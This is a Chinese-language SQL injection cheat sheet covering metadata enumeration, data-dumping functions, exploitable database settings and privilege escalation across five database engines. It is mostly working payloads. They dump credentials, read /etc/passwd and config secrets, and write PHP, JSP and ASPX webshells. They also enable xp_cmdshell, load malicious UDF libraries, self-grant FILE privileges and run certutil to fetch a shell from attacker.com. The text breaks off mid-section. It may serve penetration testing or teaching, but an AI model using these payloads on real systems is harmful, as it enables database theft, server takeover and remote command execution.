# SQL 注入支撑知识 — 特殊表、聚合函数与数据库配置

本文档覆盖 SQL 注入中四类容易被忽视但直接影响利用成败的支撑知识：数据库内置特殊表、突破读取限制的聚合/字符串函数、决定高危操作能否成功的关键配置项、以及从低权限账户升级到高权限的提权路径。

---

## 1. 数据库特殊表与元数据查询

### 1.1 为什么需要了解这些表

SQL 注入进入信息收集阶段后，核心工作就是**查询元数据**——数据库里有哪些库、哪些表、哪些列。每个数据库提供不同的系统视图来暴露这些信息。知道这些表名和替代方案，决定了你能在多深层次上探索目标数据库。

### 1.2 各数据库元数据表对照

#### MySQL / MariaDB

| 用途 | 标准查询表 | 被过滤时的替代 |
|------|-----------|--------------|
| 所有数据库 | `information_schema.schemata` | `SHOW DATABASES` (需堆叠查询) |
| 当前库所有表 | `information_schema.tables WHERE table_schema=database()` | `mysql.innodb_table_stats WHERE database_name=schema()` |
| 当前库所有表 (5.7+) | — | `sys.schema_table_statistics_with_buffer WHERE table_schema=database()` |
| 指定表的列 | `information_schema.columns WHERE table_name='x'` | `SHOW COLUMNS FROM tablename` (需堆叠或回显) |
| 无 information_schema 时 | — | `sys.x$schema_flattened_keys`, `sys.schema_auto_increment_columns` |

```sql
-- 标准查询
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

-- 被过滤时的替代 (innodb_table_stats)
' UNION SELECT group_concat(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=schema()--

-- 被过滤时的替代 (sys schema, MySQL 5.7+)
' UNION SELECT group_concat(table_name),NULL FROM sys.schema_table_statistics_with_buffer WHERE table_schema=database()--

-- 无 information_schema 列提取 (利用 join 报错泄露列名)
' UNION SELECT * FROM (SELECT * FROM users AS a JOIN users AS b USING(id,username,password))c--
-- 报错: Duplicate column name 'xxx' — 逐步泄露列名
```

#### MSSQL

| 用途 | 标准查询表 | 被过滤时的替代 |
|------|-----------|--------------|
| 所有数据库 | `master.sys.databases` | `EXEC sp_databases` (堆叠) |
| 当前库所有表 | `information_schema.tables` | `sys.tables`, `sysobjects WHERE xtype='U'` |
| 指定表的列 | `information_schema.columns` | `sys.columns WHERE object_id=OBJECT_ID('users')` |
| 所有对象 | — | `sys.objects`, `sys.all_objects` |
| 存储过程 | `information_schema.routines` | `sys.procedures` |

```sql
-- 标准查询
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_catalog=DB_NAME()--

-- 使用 sys.tables 绕过 information_schema 过滤
' UNION SELECT name,NULL FROM sys.tables--

-- 使用 sysobjects (兼容 SQL Server 2000+)
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- 提取列 (sys.columns)
' UNION SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--
```

#### Oracle

Oracle **没有** `information_schema`。其元数据通过 `ALL_`、`USER_`、`DBA_` 前缀的视图暴露。此外，Oracle 的 `SELECT` 必须带 `FROM` 子句，因此引入了 `dual` 这张特殊的单行单列表。

| 用途 | 查询表 | 说明 |
|------|--------|------|
| FROM 占位 (必须) | `dual` | 单行单列虚拟表，`SELECT 1 FROM dual` |
| 当前用户拥有的表 | `user_tables` | 当前 schema 下的表 |
| 所有可访问的表 | `all_tables` | 含其他 schema 授予访问权限的表 |
| 所有数据库中的表 | `dba_tables` | 需 DBA 权限 |
| 当前用户的列 | `user_tab_columns` | `WHERE table_name='USERS'` (大写) |
| 所有可访问的列 | `all_tab_columns` | — |
| 所有用户 | `all_users` | 等价于其他数据库的"所有数据库"概念 |
| 数据库版本 | `v$version`, `v$instance` | 版本信息 |
| 当前数据库名 | `global_name` | `SELECT * FROM global_name` |
| 当前用户权限 | `user_role_privs`, `user_sys_privs` | 权限枚举 |
| 可访问的存储过程 | `all_procedures` | — |

```sql
-- 基础: 所有查询都需要 FROM 子句
' UNION SELECT NULL FROM dual--

-- 枚举当前用户的所有表 (注意表名大写)
' UNION SELECT table_name,NULL FROM user_tables--

-- 枚举所有可访问的表
' UNION SELECT table_name,NULL FROM all_tables--

-- 提取列 (注意表名参数必须大写)
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

#### PostgreSQL

| 用途 | 查询表 | 说明 |
|------|--------|------|
| 当前数据库 | `current_database()` | 函数而非表 |
| 所有数据库 | `pg_database` | `SELECT datname FROM pg_database` |
| 当前库所有表 | `information_schema.tables` | 标准方式 |
| 当前库所有表 (替代) | `pg_catalog.pg_tables` | `WHERE schemaname NOT IN ('pg_catalog','information_schema')` |
| 指定表的列 | `information_schema.columns` | 标准方式 |
| 指定表的列 (替代) | `information_schema.columns` 或 `\d tablename` (psql) | pg_catalog 的列提取稍复杂 |

```sql
-- 标准表枚举
' UNION SELECT tablename,NULL FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')--

-- 数据库枚举
' UNION SELECT datname,NULL FROM pg_database--
```

#### SQLite

| 用途 | 查询表 | 说明 |
|------|--------|------|
| 所有表和视图 | `sqlite_master` | `SELECT name FROM sqlite_master WHERE type='table'` |
| 表结构 (建表语句) | `sqlite_master.sql` | DDL 中暴露所有列名 |
| 临时表 | `sqlite_temp_master` | 临时对象 |
| 版本信息 | `sqlite_version()` | 函数 |

```sql
-- 枚举所有表
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--

-- 直接获取建表语句 (包含完整列定义)
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

### 1.3 dual 表详解

`dual` 是 Oracle 特有的单行单列虚拟表，根源在于 Oracle 的 SQL 解析器强制要求所有 `SELECT` 语句包含 `FROM` 子句。当你只需要计算一个表达式（如 `SELECT 1+1`）或调用一个函数（如 `SELECT user`）时，Oracle 不允许省略 `FROM`，于是引入了 `dual`。

```sql
-- 其他数据库: 不需要 FROM
SELECT 1+1;

-- Oracle: 必须 FROM dual
SELECT 1+1 FROM dual;
SELECT user FROM dual;
SELECT 'x' FROM dual;
```

**在 SQL 注入中的影响**：每条 UNION SELECT 注入在 Oracle 上都必须写 `FROM dual`，否则 SQL 语法错误。这也是为什么确认数据库类型必须在早期完成——如果目标是 Oracle 而你一直用裸 `UNION SELECT NULL`，你的每次测试都会报错，且原因不是列数不对。

## 2. 读取限制绕过 — 聚合与字符串函数

SQL 注入中经常遇到两类读取限制：(1) 回显只显示一个字段或一行；(2) 字段数据长度超出回显区域。以下函数组合用于突破这些限制。

### 2.1 多行合并为单行 — 聚合拼接函数

当你需要在一个字段中展示某个表的所有数据（如所有用户名和密码），用聚合拼接：

| 数据库 | 函数 | 示例 |
|--------|------|------|
| MySQL | `GROUP_CONCAT(expr SEPARATOR ',')` | `GROUP_CONCAT(username,'~',password)` |
| MySQL (无 GROUP_CONCAT) | `CONCAT` + 逐行 `LIMIT` | 需要循环请求 |
| MSSQL (2017+) | `STRING_AGG(expr, ',')` | `STRING_AGG(username+CHAR(126)+password, CHAR(10))` |
| MSSQL (< 2017) | `FOR XML PATH` 变通 | `SELECT STUFF((SELECT ','+username FROM users FOR XML PATH('')),1,1,'')` |
| PostgreSQL | `STRING_AGG(expr, ',')` | `STRING_AGG(username\|\|'~'\|\|password, ',')` |
| Oracle | `LISTAGG(expr, ',') WITHIN GROUP (ORDER BY ...)` | `LISTAGG(username\|\|'~'\|\|password, ',') WITHIN GROUP (ORDER BY username)` |
| SQLite | `GROUP_CONCAT(expr)` | `GROUP_CONCAT(username\|\|'~'\|\|password)` |

**GROUP_CONCAT 被过滤时的逐行替代**：

```sql
-- 第 1 行
' UNION SELECT username,password FROM users LIMIT 0,1--
-- 第 2 行
' UNION SELECT username,password FROM users LIMIT 1,1--
-- 第 3 行
' UNION SELECT username,password FROM users LIMIT 2,1--
```

**GROUP_CONCAT 截断问题**：MySQL 的 `group_concat_max_len` 默认 1024 字节。数据量大时会被截断：

```sql
-- 临时调大限制 (需堆叠查询)
'; SET SESSION group_concat_max_len=1000000;--

-- 分段读取
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name BETWEEN 'a' AND 'm'--
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name BETWEEN 'n' AND 'z'--
```

### 2.2 多列合并为单列 — 字符串拼接函数

当 UNION 查询只有一列回显，但需要提取多列数据时：

| 数据库 | 操作符/函数 | 示例 |
|--------|-----------|------|
| MySQL | `CONCAT(a, sep, b)` | `CONCAT(username, '~', password)` |
| MySQL | `CONCAT_WS(sep, a, b, c)` | `CONCAT_WS('~', username, password, email)` |
| MSSQL | `+` | `username + CHAR(126) + password` |
| PostgreSQL | `\|\|` | `username \|\| '~' \|\| password` |
| Oracle | `\|\|` | `username \|\| '~' \|\| password` |
| SQLite | `\|\|` | `username \|\| '~' \|\| password` |

```sql
-- MySQL: 单列回显提取多字段
' UNION SELECT CONCAT_WS('|', username, password, email),NULL FROM users--

-- MSSQL: 使用 CHAR() 表示分隔符 (CHAR(124) = |)
' UNION SELECT username+CHAR(124)+password+CHAR(124)+email,NULL FROM users--
```

### 2.3 行数限制 — 逐行提取

| 数据库 | 语法 | 示例 |
|--------|------|------|
| MySQL | `LIMIT offset, count` 或 `LIMIT count OFFSET offset` | `LIMIT 0,1` |
| MSSQL | `OFFSET ... ROWS FETCH NEXT ... ROWS ONLY` (2012+) 或 `TOP` | `OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` |
| PostgreSQL | `LIMIT count OFFSET offset` | `LIMIT 1 OFFSET 0` |
| Oracle (12c+) | `OFFSET ... ROWS FETCH NEXT ... ROWS ONLY` | 同 MSSQL |
| Oracle (< 12c) | `ROWNUM` 子查询 | `WHERE ROWNUM <= 1` |
| SQLite | `LIMIT count OFFSET offset` | `LIMIT 1 OFFSET 0` |

```sql
-- MySQL / PostgreSQL / SQLite
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0--

-- MSSQL
' UNION SELECT username,password FROM users ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--

-- Oracle (< 12c)
' UNION SELECT username,password FROM (SELECT a.*,ROWNUM r FROM users a WHERE ROWNUM<=1) WHERE r=0--
```

### 2.4 字符串截断 — 长数据分段提取

当单字段数据过长超出回显限制时：

| 函数 | 数据库 | 说明 |
|------|--------|------|
| `SUBSTRING(str, pos, len)` | MySQL, MSSQL, PostgreSQL | 从 pos 开始取 len 个字符 |
| `SUBSTR(str, pos, len)` | MySQL, Oracle, SQLite | Oracle/SQLite 的标准写法 |
| `MID(str, pos, len)` | MySQL | SUBSTRING 的别名 |
| `LEFT(str, len)` | 通用 | 取左侧 len 个字符 |
| `RIGHT(str, len)` | 通用 | 取右侧 len 个字符 |

```sql
-- 分段读取第一列数据 (每段 30 字符)
' UNION SELECT SUBSTRING(password,1,30),NULL FROM users WHERE username='admin'--
' UNION SELECT SUBSTRING(password,31,30),NULL FROM users WHERE username='admin'--
' UNION SELECT SUBSTRING(password,61,30),NULL FROM users WHERE username='admin'--
```

### 2.5 长度探测 — 辅助盲注

| 数据库 | 函数 |
|--------|------|
| MySQL, MSSQL | `LENGTH(str)` |
| PostgreSQL | `LENGTH(str)` 或 `CHAR_LENGTH(str)` |
| Oracle | `LENGTH(str)` |
| SQLite | `LENGTH(str)` |

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>20--
```

## 3. 关键数据库配置与 SQL 注入的关系

很多 SQL 注入的高危操作并非"语法对了就能执行"，而是受**数据库配置项**的严格限制。以下按数据库列出影响注入利用的关键配置。

### 3.1 MySQL / MariaDB

#### secure_file_priv — 控制文件读写

这是 MySQL 中决定 SQL 注入能否升级为文件操作（读/写）的**核心配置**：

```sql
' UNION SELECT @@secure_file_priv,NULL--
```

| 值 | 含义 | 注入影响 |
|----|------|---------|
| `NULL` 或空 | 禁止 `LOAD_FILE()` 和 `INTO OUTFILE` | 无法通过 SQL 读写文件 |
| `/var/lib/mysql-files/` | 仅允许在该目录下读写 | 写入 webshell 需找到该目录对应的 web 路径 |
| 空字符串 `''` | 无限制（危险） | 可读任意文件、写 webshell 到任意目录 |

```sql
-- 读文件 (需 FILE 权限 + secure_file_priv 允许)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE(0x2F6574632F706173737764),NULL--  -- 十六进制路径绕过

-- 写文件 (需 FILE 权限 + secure_file_priv 允许写入目标目录)
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

#### FILE 权限

`LOAD_FILE()` 和 `INTO OUTFILE` 都需要数据库用户持有 `FILE` 权限。检查当前用户权限：

```sql
-- 查看当前用户权限
' UNION SELECT GROUP_CONCAT(privilege_type),NULL FROM information_schema.user_privileges WHERE grantee LIKE CONCAT('%',SUBSTRING_INDEX(CURRENT_USER(),'@',1),'%')--

-- 或简化为查看当前用户
' UNION SELECT CURRENT_USER(),NULL--
-- 如果是 root@localhost 或 root@%，则大概率有 FILE 权限
```

#### group_concat_max_len

控制 `GROUP_CONCAT` 结果的最大长度，默认 1024 字节。数据量大时会被静默截断：

```sql
' UNION SELECT @@group_concat_max_len,NULL--
-- 结果: 1024 表示默认值，超出部分被丢弃
```

#### max_allowed_packet

限制单次查询结果的最大大小。如果需要提取大量数据：

```sql
' UNION SELECT @@max_allowed_packet,NULL--
-- 默认通常 4MB-64MB，对大表脱库影响不大
```

#### MySQL 版本与注入技术兼容性

| 版本范围 | 相关特性 |
|---------|---------|
| < 5.5 | 无 `sys` schema；`information_schema` 的查询性能差 |
| 5.5+ | 引入 `sys` schema（5.7+ 更完善） |
| 5.5.5+ | `EXP(~(SELECT ...))` 报错注入可用 |
| 5.6+ | 引入了 `GET_LOCK()` 等辅助函数 |
| 8.0+ | `information_schema` 查询性能提升；部分报错函数被修复 |
| 8.0.14+ | `HANDLER ... READ ... WHERE` 条件过滤 |

#### sql_mode 对注入的影响

```sql
' UNION SELECT @@sql_mode,NULL--
```

- 含 `STRICT_TRANS_TABLES` 时，类型不匹配更容易报错（利于报错注入）
- 含 `PIPES_AS_CONCAT` 时，`||` 作为字符串拼接而非 `OR`（影响 Oracle/PostgreSQL 风格 payload）
- 含 `NO_BACKSLASH_ESCAPES` 时，反斜杠转义失效（字符型闭合的 `1\` 测试无效）

### 3.2 MSSQL

#### xp_cmdshell — 命令执行

MSSQL 中最关键的提权配置。默认**禁用**：

```sql
-- 检查 xp_cmdshell 状态
'; SELECT value FROM sys.configurations WHERE name='xp_cmdshell'--
-- 0 = 禁用, 1 = 启用

-- 启用 xp_cmdshell (需 sysadmin 角色)
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--

-- 执行命令
'; EXEC xp_cmdshell 'whoami'--
```

#### 当前用户角色

```sql
'; SELECT SYSTEM_USER--
'; SELECT IS_SRVROLEMEMBER('sysadmin')--   -- 1 = 是 sysadmin
'; SELECT IS_SRVROLEMEMBER('db_owner')--   -- 1 = 是 db_owner
```

#### OLE Automation — HTTP/DNS 外带

如果 `xp_cmdshell` 不可用，OLE Automation 可能用于外带数据：

```sql
-- 检查 OLE Automation 是否可用
'; SELECT value FROM sys.configurations WHERE name='Ole Automation Procedures'--

-- 如被禁用但你是 sysadmin
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE--
```

#### CLR 集成

如果 CLR 已启用，可创建托管存储过程执行任意 .NET 代码：

```sql
'; SELECT value FROM sys.configurations WHERE name='clr enabled'--
```

### 3.3 PostgreSQL

#### 超级用户状态

PostgreSQL 中很多高危操作（读文件、执行命令）需要超级用户：

```sql
' UNION SELECT current_setting('is_superuser'),NULL--
-- on = 是超级用户, off = 不是
```

#### pg_read_file / pg_read_binary_file — 读文件

仅**超级用户**可用：

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,10000),NULL--
-- 第二个参数: 读取起始偏移; 第三个参数: 读取最大字节数
```

#### COPY ... TO PROGRAM — 命令执行

```sql
'; COPY (SELECT '') TO PROGRAM 'id'--
-- 仅超级用户可用
```

#### dblink 扩展 — OAST 外带

需要安装 `dblink` 扩展：

```sql
-- 检查 dblink 是否已安装
' UNION SELECT extname,NULL FROM pg_extension--
```

#### LOAD — 加载动态库

```sql
'; LOAD '/tmp/evil.so'--
-- 需要超级用户，且文件必须位于服务器文件系统上
```

### 3.4 Oracle

#### 数据库链接 (Database Links) — SSRF

Oracle 中的 `UTL_HTTP`、`DBMS_LDAP`、`HTTPURITYPE` 等包可用于外带数据和 SSRF 攻击：

```sql
-- 检查 UTL_HTTP 权限
' UNION SELECT grantee,privilege FROM dba_tab_privs WHERE table_name='UTL_HTTP'--

-- 检查当前用户的系统权限
' UNION SELECT privilege,NULL FROM user_sys_privs--
```

#### Java 权限 — 命令执行

Oracle 的 Java 存储过程可用于执行系统命令：

```sql
-- 检查 Java 权限
' UNION SELECT grantee,privilege FROM dba_java_policy--
```

#### UTL_FILE — 文件操作

```sql
-- 检查 UTL_FILE 可访问的目录
' UNION SELECT directory_name,directory_path FROM all_directories--
```

### 3.5 影响所有数据库的通用配置

#### 数据库网络出站能力

Out-of-band (OAST) 注入技术依赖数据库服务器能够发起出站 DNS/HTTP 请求。以下因素决定 OAST 是否可行：

- **防火墙规则**：生产环境通常限制数据库服务器的出站连接
- **DNS 出口**：相比 HTTP，DNS 查询（UDP 53）更常被允许（DNS 是基础服务）
- **网络隔离**：数据库在 VPC 内网中，可能完全无法解析外部域名

```sql
-- MSSQL: 测试 DNS 出站
'; EXEC master..xp_dirtree '//YOUR-COLLABORATOR.burpcollaborator.net/a'--

-- Oracle: 测试 HTTP 出站
' UNION SELECT UTL_HTTP.REQUEST('http://YOUR-COLLABORATOR.burpcollaborator.net/test') FROM dual--
```

#### 堆叠查询支持

堆叠查询（`;` 分隔多条 SQL）取决于**应用驱动**而非数据库本身：

| 驱动/语言 | 堆叠查询支持 |
|----------|------------|
| PHP `mysqli` + `multi_query()` | 是 |
| PHP `PDO` 默认 | 否（需 `PDO::MYSQL_ATTR_MULTI_STATEMENTS`） |
| Java JDBC | 取决于数据库 |
| .NET SqlClient | 是 (MSSQL) |
| Python psycopg2 | 是 (PostgreSQL) |
| Node.js mysql2 | 否（单条查询） |

### 3.6 文件写入 — 各数据库语法与限制

读文件用于窃取源码和配置；写文件则是提权的关键一步——写入 webshell、UDF 共享库、计划任务、SSH 公钥等。每种数据库对写文件有各自严格的语法要求和配置限制。

#### MySQL / MariaDB

MySQL 提供两种写文件语法：

| 语法 | 行为 | 适用场景 |
|------|------|---------|
| `SELECT ... INTO OUTFILE 'path'` | 写入文本文件，自动追加换行符，写入前检查文件是否已存在（不能覆盖） | webshell、数据导出 |
| `SELECT ... INTO DUMPFILE 'path'` | 写入二进制文件，不追加换行，不检查文件存在，写入完整十六进制数据 | UDF .so/.dll、MOF 文件 |

```sql
-- INTO OUTFILE: 文本写入（文件不能预先存在）
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'#

-- INTO OUTFILE: Windows 路径 + 十六进制编码 payload (避免引号问题)
' UNION SELECT 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E INTO OUTFILE 'C:/xampp/htdocs/shell.php'#

-- INTO DUMPFILE: 二进制写入（可覆盖已有文件，适合 UDF dll/so）
' UNION SELECT 0x4D5A9000... INTO DUMPFILE 'C:/mysql/lib/plugin/udf.dll'#
```

**写入限制检查清单**：

```sql
-- 1. secure_file_priv 是否允许写入
' UNION SELECT @@secure_file_priv,NULL--
-- NULL → 完全禁止; '/path/' → 仅允许该目录; '' → 无限制

-- 2. 是否有 FILE 权限
' UNION SELECT FILE_PRIV,NULL FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1)--

-- 3. 目录是否存在且可写 (MySQL 以 mysql 用户身份运行)
--    可通过 LOAD_FILE 读 /etc/passwd 或 /proc/1/environ 推断 OS 用户

-- 4. 磁盘空间是否充足
' UNION SELECT @@max_allowed_packet,NULL--
-- INTO DUMPFILE 单次写入受此限制
```

**INTO OUTFILE vs INTO DUMPFILE 的关键区别**：

| 特性 | INTO OUTFILE | INTO DUMPFILE |
|------|-------------|---------------|
| 文件已存在时 | **报错**，拒绝写入 | **直接覆盖** |
| 自动追加换行 | 是 | **否** |
| 转义特殊字符 | 是（`\n`→实际换行，`\t`→制表符） | **否**，原样写入 |
| 适用内容 | 文本（webshell、CSV） | 二进制（UDF dll、MOF） |
| 单次写入大小 | `max_allowed_packet` 限制 | `max_allowed_packet` 限制 |

#### MSSQL

MSSQL 没有直接的 `SELECT INTO FILE` 语法。写文件依赖 `xp_cmdshell` 调用操作系统命令来完成：

```sql
-- 方法 1: xp_cmdshell + echo (适合短内容，注意转义)
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]);?^> > C:\inetpub\wwwroot\shell.php'--

-- 方法 2: xp_cmdshell + certutil 解码 base64 (适合大量数据)
'; EXEC xp_cmdshell 'certutil -decode C:\tmp\payload.b64 C:\inetpub\wwwroot\shell.aspx'--

-- 方法 3: xp_cmdshell + powershell (现代 Windows Server)
'; EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\inetpub\wwwroot\shell.aspx -Value [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''BASE64_PAYLOAD''))"'--

-- 方法 4: BCP 导出表数据到文件 (需要数据已在表中)
'; CREATE TABLE #payload(data VARCHAR(8000));INSERT INTO #payload VALUES('<?php system($_GET["cmd"]);?>');EXEC xp_cmdshell 'bcp "SELECT data FROM #payload" queryout C:\inetpub\wwwroot\shell.php -c -T -S localhost'--

-- 方法 5: xp_cmdshell + certutil 远程下载 (无需事先写入数据)
'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```

**MSSQL 转义注意事项**：
- cmd.exe 中 `>` 和 `<` 需用 `^` 转义（`^>`）
- `%` 需用 `%%` 转义（在 xp_cmdshell 中）
- PowerShell 路径更可靠，但需要目标 Server 2008+

#### PostgreSQL

```sql
-- 方法 1: COPY TO 导出到文件 (仅超户)
'; COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php'--

-- 方法 2: pg_write_file 直接写入 (PG 9.1+，仅超户，文件不能超过 1GB)
'; SELECT pg_write_file('/var/www/html/shell.php','<?php system($_GET["cmd"]);?>')--

-- 方法 3: COPY PROGRAM 通过系统命令写文件
'; COPY (SELECT '') TO PROGRAM 'echo "<?php system($_GET[\"cmd\"]);?>" > /var/www/html/shell.php'--

-- 方法 4: lo_export 大对象导出 (将大对象 OID 导出到文件)
'; SELECT lo_from_bytea(0,'<?php system($_GET["cmd"]);?>') AS oid \gset
'; SELECT lo_export(:'oid','/var/www/html/shell.php')--
```

**PostgreSQL 写入限制**：
- `COPY TO` 写入的文件**所有者是 postgres 操作系统用户**，权限通常 0600
- `pg_write_file` 只能写入**新文件或清空已有文件**，不能追加
- 写入路径受 PostgreSQL 的 `data_directory` 限制（除非绝对路径）

#### Oracle

```sql
-- 方法 1: UTL_FILE (需 CREATE DIRECTORY 或已有目录对象)
-- 先查可用目录
' UNION SELECT directory_name,directory_path FROM all_directories--
-- 写入文件
'; DECLARE f UTL_FILE.FILE_TYPE;BEGIN f:=UTL_FILE.FOPEN('WEB_DIR','shell.jsp','W');UTL_FILE.PUT_LINE(f,'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');UTL_FILE.FCLOSE(f);END;--

-- 方法 2: DBMS_XSLPROCESSOR 写入 (某些版本可用)
'; BEGIN DBMS_XSLPROCESSOR.CLOB2FILE(TO_CLOB('<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'),'WEB_DIR','shell.jsp');END;--

-- 方法 3: DBMS_ADVISOR 创建文件 (间接方式)
'; BEGIN DBMS_ADVISOR.CREATE_FILE('<?php system($_GET["cmd"]);?>','WEB_DIR','shell.php');END;--
```

**Oracle 写入特点**：
- 写入路径必须通过 `CREATE DIRECTORY` 对象映射（不能直接写绝对路径）
- `UTL_FILE` 每行最多 32767 字节
- 写入文件的所有者是 Oracle 进程的操作系统用户（通常 `oracle`）

#### 各数据库写入能力对比

| 数据库 | 写入语法 | 需要权限 | 关键限制 |
|--------|---------|---------|---------|
| MySQL | `INTO OUTFILE` / `INTO DUMPFILE` | FILE 权限 | `secure_file_priv` 控制目录白名单 |
| MSSQL | 无直接语法，依赖 `xp_cmdshell` | sysadmin | `xp_cmdshell` 默认禁用 |
| PostgreSQL | `COPY TO` / `pg_write_file` | 超级用户 | 文件所有者是 postgres，需 web 服务可读 |
| Oracle | `UTL_FILE.PUT_LINE` | 目录对象读写权限 | 需预定义 `DIRECTORY` 对象 |

## 4. 注入过程中的权限提升

SQL 注入的权限提升是指在数据库层面从当前低权限用户逐步获取更高权限（如 FILE 权限、DBA/sysadmin 角色），最终实现对操作系统命令执行或任意文件读写的完整控制。以下按数据库分别梳理提权路径。

### 4.1 理解起点：先确认当前身份和权限

提权的第一步永远是摸底。以下查询按数据库分列：

```sql
-- MySQL: 当前用户和主机
' UNION SELECT CONCAT(user(),'@',@@hostname),NULL--
' UNION SELECT CURRENT_USER(),NULL--

-- MySQL: 是否持有 FILE 权限
' UNION SELECT GROUP_CONCAT(privilege_type),NULL FROM information_schema.user_privileges WHERE grantee LIKE CONCAT('%',SUBSTRING_INDEX(CURRENT_USER(),'@',1),'%')--

-- MySQL: 所有用户列表 (确认有哪些高权限账户可尝试)
' UNION SELECT GROUP_CONCAT(CONCAT(user,'@',host)),NULL FROM mysql.user--

-- MSSQL: 当前角色
'; SELECT SYSTEM_USER,USER_NAME(),IS_SRVROLEMEMBER('sysadmin')--

-- MSSQL: 是否有 xp_cmdshell 执行权限
'; SELECT permission_name FROM fn_my_permissions(NULL,'SERVER') WHERE permission_name IN ('EXECUTE','CONTROL SERVER')--

-- PostgreSQL: 是否超级用户
' UNION SELECT current_setting('is_superuser'),current_user--
```

**代码中的静态凭据**：如果应用使用硬编码的数据库凭据（通常写在配置文件如 `application.properties`、`web.config`、`.env` 中），这些凭据可能是高权限账户。通过文件读取功能获取源码即可取到：

```sql
-- MySQL 尝试读取常见配置文件
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--
' UNION SELECT LOAD_FILE('/var/www/html/.env'),NULL--
' UNION SELECT LOAD_FILE('C:/inetpub/wwwroot/web.config'),NULL--
```

### 4.2 MySQL / MariaDB 提权路径

#### 路径一：获取 FILE 权限 → 读写文件 → UDF 提权 → 命令执行

这是 MySQL 最经典的提权链。前提是当前用户能执行 `GRANT` 或 `UPDATE mysql.*` 表：

```sql
-- 1. 检查是否已有 FILE 权限
' UNION SELECT FILE_PRIV,NULL FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1)--

-- 2. 如果没有，尝试自授权 (需 GRANT OPTION)
'; GRANT FILE ON *.* TO CURRENT_USER()#

-- 3. 如果 GRANT 被禁用，直接修改 mysql.user 表 (MySQL 5.7+ 注意: 需要 flush privileges)
'; UPDATE mysql.user SET File_priv='Y' WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1)#
'; FLUSH PRIVILEGES#
```

**UDF (User Defined Function) 提权**：在获得 FILE 权限后，向 MySQL plugin 目录写入编译好的恶意共享库（.so / .dll），然后创建调用该库函数的 UDF：

```sql
-- 1. 查询 plugin 目录路径
' UNION SELECT @@plugin_dir,NULL--

-- 2. 将编译好的 UDF .dll/.so 写入 plugin 目录 (需 FILE 权限)
' UNION SELECT 0x4D5A9000030000... INTO DUMPFILE 'C:/mysql/lib/plugin/udf.dll'--
-- (0x... 是恶意共享库的十六进制编码，先转储再转为 hex)

-- 3. 创建调用该库的 UDF 函数
'; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll'#
'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'#

-- 4. 执行系统命令
'; SELECT sys_exec('whoami > C:/tmp/output.txt')#
'; SELECT sys_eval('whoami')#
```

**关键前置条件检查**：
- `@@plugin_dir` 必须可写（否则 DUMPFILE 失败）
- `secure_file_priv` 必须为空或包含 plugin 目录路径
- MySQL < 5.0.67 或某些版本可直接覆盖已有 UDF

#### 路径二：通过 INTO OUTFILE 写入 WebShell → 反弹 Shell

如果 FILE 权限可用且已知 Web 根目录的绝对路径：

```sql
-- 写入 PHP webshell
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/cmd.php'#
' UNION SELECT 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E INTO OUTFILE '/var/www/html/cmd.php'#

-- 写入 JSP webshell
' UNION SELECT '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>' INTO OUTFILE '/var/www/html/cmd.jsp'#

-- 写入 ASPX webshell
' UNION SELECT '<%@Page Language="C#"%><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>' INTO OUTFILE 'C:/inetpub/wwwroot/cmd.aspx'#
```

**Web 根目录探测技巧**：
```sql
-- 通过读取 Apache/Nginx 配置推断路径
' UNION SELECT LOAD_FILE('/etc/apache2/sites-available/000-default.conf'),NULL--
' UNION SELECT LOAD_FILE('/etc/nginx/sites-available/default'),NULL--
-- Windows IIS
' UNION SELECT LOAD_FILE('C:/Windows/System32/inetsrv/config/applicationHost.config'),NULL--
```

#### 路径三：MySQL 漏洞提权 (CVE 利用)

当无法获取 FILE 权限且无法 GRANT 时，利用 MySQL 本身的安全漏洞：

- **CVE-2016-6662 / CVE-2016-6663** (MySQL 条件竞争提权)：通过 `general_log` 和 `general_log_file` 写入 webshell，然后竞争条件触发
